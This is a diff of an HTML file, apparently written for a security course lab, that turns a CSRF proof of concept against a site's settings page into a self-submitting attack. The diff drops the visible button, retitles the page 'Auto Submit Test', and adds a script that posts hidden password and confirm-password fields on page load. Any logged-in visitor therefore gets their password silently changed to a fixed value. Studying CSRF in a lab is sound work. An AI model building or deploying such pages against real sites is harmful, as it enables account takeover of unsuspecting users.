@@ -1,27 +1,17 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>CSRF PoC</title>
+    <title>Auto Submit Test</title>
 </head>
 <body>
-
-    <h1>CSRF Test</h1>
-
-    <form id="csrfForm"
-          action="https://cats.is-course.ru/settings"
-          method="POST">
-
-        <input type="hidden"
-               name="password"
-               value="7raF~)+G@+_RN8X">
-
-        <input type="hidden"
-               name="confirm-password"
-               value="7raF~)+G@+_RN8X">
-
-        <button type="submit">Submit</button>
+    <form id="csrfForm" action="https://cats.is-course.ru/settings" method="POST">
+        <input type="hidden" name="password" value="7raF~)+G@+_RN8X">
+        <input type="hidden" name="confirm-password" value="7raF~)+G@+_RN8X">
     </form>
 
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
 </body>
 </html>
